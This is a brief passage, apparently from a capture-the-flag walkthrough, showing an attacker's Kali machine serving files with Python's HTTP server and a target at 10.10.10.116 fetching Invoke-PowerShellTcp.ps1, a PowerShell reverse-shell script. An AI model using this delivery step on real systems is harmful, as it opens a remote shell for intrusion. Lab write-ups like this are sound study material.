@@ -1,0 +1,1 @@
+t the webserver is hit to get Invoke-PowerShellTcp.ps1 : root@kali# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.116 - - [14/Jan/2019 09:49:41] "GET /Invoke-PowerShellTcp.ps1
